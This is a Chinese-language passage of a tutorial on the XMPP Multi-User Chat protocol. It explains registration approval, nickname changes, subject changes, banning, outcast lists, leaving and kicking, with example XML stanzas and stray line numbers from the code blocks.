<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='reg2'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;service-unavailable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 分支3 用户提交数据不合法，拒绝申请，并返回一个&lt;bad-request/&gt;错误给用户</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='reg2'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;error type='modify'&gt;<br>     &lt;bad-request xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 批准注册申请-管理员<br> 如果一个服务不自动接受注册到房间的请求，可为房间管理员提供一个方法来批准或拒绝来自 Jabber 的注册请求，房间收到用户发言申请，房间立即通过转发包含一个数据表格的&lt;message/&gt; 节给管理员用于批准或拒绝这个申请(推荐以下数据表格)</p> 
<p>&lt;message from='darkcave@chat.shakespeare.lit'<br>          id='approve'<br>          to='crone1@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='jabber:x:data' type='form'&gt;<br>     &lt;title&gt;Registration request&lt;/title&gt;<br>     &lt;instructions&gt;<br>       To approve this registration request, select the<br>       &amp;quot;Allow this person to register with the room?&amp;quot;<br>       checkbox and click OK. To skip this request, click the <br>       cancel button.<br>     &lt;/instructions&gt;<br>     &lt;field var='FORM_TYPE' type='hidden'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#register&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_first'<br>            type='text-single'<br>            label='Given Name'&gt;<br>       &lt;value&gt;Brunhilde&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_last'<br>            type="text-single"<br>            label="Family Name"&gt;<br>       &lt;value&gt;Entwhistle-Throckmorton&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_roomnick'<br>            type="text-single"<br>            label="Desired Nickname"&gt;<br>       &lt;value&gt;thirdwitch&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_url'<br>            type="text-single"<br>            label="User URL"&gt;<br>       &lt;value&gt;http://witchesonline/~hag66/&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_email'<br>            type="text-single"<br>            label="Email Address"&gt;<br>       &lt;value&gt;hag66@witchesonline&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_faqentry'<br>            type="text-single"<br>            label="FAQ Entry"&gt;<br>       &lt;value&gt;Just another witch.&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_allow'<br>            type='boolean'<br>            label='Allow this person to register with the room?'&gt;<br>       &lt;value&gt;0&lt;/value&gt;<br>     &lt;/field&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 31<br> 32<br> 33<br> 34<br> 35<br> 36<br> 37<br> 38<br> 39<br> 40<br> 41<br> 42<br> 43<br> 44<br> 45<br> 46<br> 47<br> 48<br> 49<br> 50<br> 51<br> 若管理员批准，则提交表格</p> 
<p>&lt;message from='crone1@shakespeare.lit/pda'<br>          id='approve'<br>          to='darkcave@chat.shakespeare.lit'&gt;<br>   &lt;x xmlns='jabber:x:data' type='submit'&gt;<br>     &lt;field var='FORM_TYPE' type='hidden'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#register&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_first'&gt;<br>       &lt;value&gt;Brunhilde&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_last'&gt;<br>       &lt;value&gt;Entwhistle-Throckmorton&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_roomnick'&gt;<br>       &lt;value&gt;thirdwitch&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_url'&gt;<br>       &lt;value&gt;http://witchesonline/~hag66/&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_email'&gt;<br>       &lt;value&gt;hag66@witchesonline&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_faqentry'&gt;<br>       &lt;value&gt;Just another witch.&lt;/value&gt;<br>     &lt;/field&gt;<br>     &lt;field var='muc#register_allow'&gt;<br>       &lt;value&gt;1&lt;/value&gt;<br>     &lt;/field&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 服务修改用户none岗位为member岗位，并根据用户在线情况区别广播出席信息<br> 若该用户在线，服务以该用户名义广播更新出席信息，该出席信息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“member”的&lt;item/&gt; 子元素</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 若该用户离线，服务从房间本身向其余所有房客发送信息，信息包含一个满足http://jabber.org/protocol/muc#user 名字空间 &lt;x/&gt; 元素并包含一个affiliation属性值设为“member”的&lt;item/&gt; 子元素</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/message&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 发现保留昵称<br> 若用户通过显示的房间注册，数据库集成或者昵称锁定“lockdown”设置了一个保留昵称，则在用户加入房间前需尝试发现自己的保留昵称，通过发送一个发现服务信息请求并指定一个服务发现节点到房间实现</p> 
<p>&lt;iq from='hag66@shakespeare.lit/pda'<br>     id='getnick1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/disco#info'<br>          node='x-roomuser-item'/&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 对多用户聊天以上服务发现节点支持是可选的，若房间或服务不支持上述的服务发现节点，则返回一个&lt;feature-not-implemented/&gt;错误给用户，若支持该特性，则根据用户是否注册保留的房间昵称区别处理<br> 用户已注册，返回一个服务发现的&lt;identity/&gt;元素，其name属性值为昵称(此处category/type应该为“conference”/“text”)</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='getnick1'<br>     to='hag66@shakespeare.lit/pda'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/disco#info'<br>          node='x-roomuser-item'&gt;<br>     &lt;identity<br>         category='conference'<br>         name='thirdwitch'<br>         type='text'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 用户未注册，则返回一个空的服务发现&lt;query/&gt;元素</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='getnick1'<br>     to='hag66@shakespeare.lit/pda'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/disco#info'/&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 更改昵称-任何用户<br> 多用户聊天的一个功能便是房客可以修改自己在房间的昵称，通过发送一个更新的出席信息给房间，准确来说是发送出席信息给一个新的房间JID(只变更房间JID资源部分)</p> 
<p>&lt;presence<br>     from='hag66@shakespeare.lit/pda'<br>     to='darkcave@chat.shakespeare.lit/oldhag'/&gt;<br> 1<br> 2<br> 3<br> 昵称修改成功，房间将更新的新旧房间JID出席信息广播给所有用户，用户的旧房间JID类型修改为unavailable，这个不可用出席信息必须在一个满足http://jabber.org/protocol/muc#user名字空间的&lt;x/&gt;子元素里包含扩展信息：新昵称(使接受者关联新旧昵称)和状态码303</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           nick='oldhag'<br>           role='participant'/&gt;<br>     &lt;status code='303'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='wiccarocks@shakespeare.lit/laptop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           nick='oldhag'<br>           role='participant'/&gt;<br>     &lt;status code='303'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           nick='oldhag'<br>           role='participant'/&gt;<br>     &lt;status code='303'/&gt;<br>     &lt;status code='110'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/oldhag'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/oldhag'<br>     to='wiccarocks@shakespeare.lit/laptop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/oldhag'<br>     to='hag66@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member'<br>           jid='hag66@shakespeare.lit/pda'<br>           role='participant'/&gt;<br>     &lt;status code='110'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 26<br> 27<br> 28<br> 29<br> 30<br> 31<br> 32<br> 33<br> 34<br> 35<br> 36<br> 37<br> 38<br> 39<br> 40<br> 41<br> 42<br> 43<br> 44<br> 45<br> 46<br> 47<br> 48<br> 49<br> 50<br> 51<br> 52<br> 53<br> 54<br> 55<br> 56<br> 57<br> 58<br> 59<br> 60<br> 61<br> 62<br> 63<br> 64<br> 65<br> 66<br> 昵称修改失败，根据昵称修改失败原因分为以下两个分支<br> 分支1 昵称冲突(昵称被其他用户使用或者预期昵称是其他用户保留昵称)，服务拒绝这次昵称修改，返回用户一个类型为error的出席信息节，并指明&lt;conflict/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;conflict xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 分支2 房间昵称被锁定，用户尝试修改自己被房间锁定昵称，返回用户一个类型为error的出席信息节，并指明&lt;not-acceptable/&gt;错误条件</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-acceptable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 更改可用性状态-任何用户<br> 多用户聊天的一个功能便是房客可以修改自己可用性状态，通过发送一个更新的出席信息给房间，准确来说是通过调整出席信息中&lt;show/&gt; 和&lt;status/&gt; 元素变更通知</p> 
<p>&lt;presence<br>     from='wiccarocks@shakespeare.lit/laptop'<br>     to='darkcave@chat.shakespeare.lit/oldhag'&gt;<br>   &lt;show&gt;xa&lt;/show&gt;<br>   &lt;status&gt;gone where the goblins go&lt;/status&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 服务将更新的出席信息广播给每个房客，包含扩展的出席信息，该房客角色和全JID(给有权知道的用户)</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/secondwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;show&gt;xa&lt;/show&gt;<br>   &lt;status&gt;gone where the goblins go&lt;/status&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='admin'<br>           jid='wiccarocks@shakespeare.lit/laptop'<br>           role='moderator'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 修改房间主题-主持人(可配置)<br> 多用户聊天的一个功能便是变更房间主题，缺省权限为主持人(可配置，允许与会者甚至游客修改)，主题变更是通过发送一个类型为groupchat的消息给&lt;room@service&gt;实现的，此外，&lt;message/&gt;必须包含一个&lt;subject/&gt;元素指定新的主题，不可包含&lt;body/&gt;和&lt;thread/&gt;元素</p> 
<p>&lt;message<br>     from='wiccarocks@shakespeare.lit/laptop'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='groupchat'&gt;<br>   &lt;subject&gt;Fire Burn and Cauldron Bubble!&lt;/subject&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 若主题变更成功，服务修改from属性为变更主题用户房间JID，并发送该变更主题消息给所有其他房客</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/secondwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='groupchat'&gt;<br>   &lt;subject&gt;Fire Burn and Cauldron Bubble!&lt;/subject&gt;<br> &lt;/message&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 若主题变更失败(用户没有权限修改房间主题)，返回用户一个error类型的消息，并指明&lt;forbidden/&gt;错误条件</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;subject&gt;Fire Burn and Cauldron Bubble!&lt;/subject&gt;<br>   &lt;error type='auth'&gt;<br>     &lt;forbidden xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 延伸，移除当前主题，设置主题为空，用户通过发送一个空的&lt;subject/&gt;元素给&lt;room@service&gt;实现</p> 
<p>&lt;message<br>     from='wiccarocks@shakespeare.lit/laptop'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='groupchat'&gt;<br>   &lt;subject&gt;&lt;/subject&gt;<br> &lt;/message&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 禁止用户-管理员或所有者<br> 管理员操作基于房客纯JID，通过向服务发送一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;元素且类型为set的&lt;qi/&gt;节，将该房客岗位修改为outcast实现(reason元素可选)</p> 
<p>&lt;iq from='kinghenryv@shakespeare.lit/throne'<br>     id='ban1'<br>     to='southampton@henryv.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='outcast'<br>           jid='earlofcambridge@shakespeare.lit'/&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 若请求失败(尝试禁止岗位比自己高的房客)，服务拒绝请求，并返回一个&lt;not-allowed/&gt;错误条件</p> 
<p>&lt;iq from='kinghenryv@shakespeare.lit/throne'<br>     id='ban1'<br>     to='southampton@henryv.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='outcast'<br>           jid='earlofcambridge@shakespeare.lit'&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-allowed xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 若请求成功，服务将被禁止用户纯JID加入黑名单，并将被禁止用户昵称从已注册昵称列表移除，返回一个空的类型为result的&lt;iq&gt;节给管理员通知操作成功</p> 
<p>&lt;iq from='southampton@henryv.shakespeare.lit'<br>     id='ban1'<br>     to='kinghenryv@shakespeare.lit/throne'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 服务移除房间中被禁止的用户，通过发送unavailable类型的出席信息节给每个被禁止用户，扩展信息附带状态码301，禁止执行用户纯JID，被禁止原因(可选)</p> 
<p>&lt;presence<br>     from='southampton@henryv.shakespeare.lit/cambridge'<br>     to='earlofcambridge@shakespeare.lit/stabber'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='outcast' role='none'&gt;<br>       &lt;actor jid='kinghenryv@shakespeare.lit'/&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>     &lt;status code='301'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 服务以被禁止用户房间JID名义向房间其余房客发送unavailable类型的出席信息，扩展信息包含状态码301，执行者actor，被禁止原因reason(可选)</p> 
<p>&lt;presence<br>     type='unavailable'<br>     from='southampton@henryv.shakespeare.lit/cambridge'<br>     to='exeter@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='outcast'<br>           jid='earlofcambridge@shakespeare.lit/stabber'<br>           role='none'/&gt;<br>     &lt;status code='301'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 修改黑名单-管理员或所有者<br> 黑名单操作是基于用户纯JID的，管理员首先通过向服务发送给一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;元素的类型为get的&lt;iq/&gt;节，请求岗位为outcast的用户名单</p> 
<p>&lt;iq from='kinghenryv@shakespeare.lit/throne'<br>     id='ban2'<br>     to='southampton@henryv.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='outcast'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 服务发送一个类型为result的&lt;iq/&gt;节返回所有岗位为outcast的用户名单给管理员，每个条目必须包含affiliation和jid属性，不应该包含nick和role属性</p> 
<p>&lt;iq from='southampton@henryv.shakespeare.lit'<br>     id='ban2'<br>     to='kinghenryv@shakespeare.lit/throne'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='outcast'<br>           jid='earlofcambridge@shakespeare.lit'&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 管理员修改黑名单条目返回给服务，每个条目必须包含affiliation属性(禁止设置outcast，解封设置none)和jid属性，不应该包含nick属性，不可以包含role属性，此外reason属性和actor属性可选</p> 
<p>&lt;iq from='kinghenryv@shakespeare.lit/throne'<br>     id='ban3'<br>     to='southampton@henryv.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item affiliation='outcast'<br>           jid='earlofcambridge@shakespeare.lit'&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>     &lt;item affiliation='outcast'&gt;<br>           jid='lordscroop@shakespeare.lit'&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>     &lt;item affiliation='outcast'<br>           jid='sirthomasgrey@shakespeare.lit'&gt;<br>       &lt;reason&gt;Treason&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 黑名单更新后，服务返回一个空的类型为result的&lt;iq/&gt;节给管理员通知处理成功</p> 
<p>&lt;iq from='southampton@henryv.shakespeare.lit'<br>     id='ban3'<br>     to='kinghenryv@shakespeare.lit/throne'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 退出房间<br> 主动退出-退出<br> 用户退出一个多用户聊天房间，直接发送一个类型为“unavailable”的出席信息节给正在使用这个房间的</p> 
<p>&lt;presence<br>     from='hag66@shakespeare.lit/pda'<br>     to='darkcave@chat.shakespeare.lit/thirdwitch'<br>     type='unavailable'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 服务以退出用户房间JID名义发送unavailable”的出席信息节给这个要离开的房客的全JID(包含状态码110)以及房间内其他所有房客，此外，<br> 服务反射发送的出席信息节必须包含该退出用户的岗位和角色信息(role设置为none，表示该用户不再是一个房客)<br> 注意：<br> 若用户下线未主动发送出席信息，该用户服务器负责替代该用户发送不可用出席信息<br> 若用户服务器下线或该用户服务器与该用户连接的MUC服务失去连接，负责监视的MUC服务收到错误信息节确定该用户是否下线，若确定该用户已下线，则按该用户已发送不可用信息处理<br> 若该房间为临时房间，则最后一个用户退出，服务需负责销毁房间</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='none'/&gt;<br>     &lt;status code='110'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='none'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='wiccarocks@shakespeare.lit/laptop'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='none'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 13<br> 14<br> 15<br> 16<br> 17<br> 18<br> 19<br> 20<br> 21<br> 22<br> 23<br> 24<br> 25<br> 延伸-自定义退出信息<br> 在出席信息节包含一个常规的 &lt;status/&gt; 信息实现自定义退出信息</p> 
<p>&lt;presence<br>     from='wiccarocks@shakespeare.lit/laptop'<br>     to='darkcave@chat.shakespeare.lit/oldhag'<br>     type='unavailable'&gt;<br>   &lt;status&gt;gone where the goblins go&lt;/status&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 被动退出-踢出<br> 踢人通常基于房客的房间昵称来执行，有权限用户将房客角色设为none实现，通过向服务发送一个包含满足http://jabber.org/protocol/muc#admin名称空间的&lt;query/&gt;类型为set的&lt;iq/&gt;节进行操作</p> 
<p>&lt;iq from='fluellen@shakespeare.lit/pda'<br>     id='kick1'<br>     to='harfleur@henryv.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#admin'&gt;<br>     &lt;item nick='pistol' role='none'&gt;<br>       &lt;reason&gt;Avaunt, you cullion!&lt;/reason&gt;<br>     &lt;/item&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 若踢出成功，服务向被踢出用户发送一个类型为unavailable的出席信息，并在扩展信息中包含状态码307，reason子元素(可选)以及踢人执行者纯JID</p> 
<p>&lt;presence<br>     from='harfleur@henryv.shakespeare.lit/pistol'<br>     to='pistol@shakespeare.lit/harfleur'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'&gt;<br>       &lt;actor jid='fluellen@shakespeare.lit'/&gt;<br>       &lt;reason&gt;Avaunt, you cullion!&lt;/reason&gt;<br>     &lt;/item&gt;<br>     &lt;status code='307'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 12<br> 服务通过发送给一个空的类型为result的&lt;iq/&gt;节给执行者通知该用户已被踢出</p> 
<p>&lt;iq from='harfleur@henryv.shakespeare.lit'<br>     id='kick1'<br>     to='fluellen@shakespeare.lit/pda'<br>     type='result'/&gt;<br> 1<br> 2<br> 3<br> 4<br> 服务以被踢出用户房间JID名义向房间其他房客发送类型为unavailable的出席信息，包含状态码status，可选原因reason以及执行者actor信息</p> 
<p>&lt;presence<br>     from='harfleur@henryv.shakespeare.lit/pistol'<br>     to='gower@shakespeare.lit/cell'<br>     type='unavailable'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='none' role='none'/&gt;<br>     &lt;status code='307'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>[ ... ]<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br> 10<br> 11<br> 若踢出失败(用户尝试踢出比自己岗位高的用户)，服务拒绝用户请求，并返回一个&lt;not-allowed/&gt;错误条件</p> 
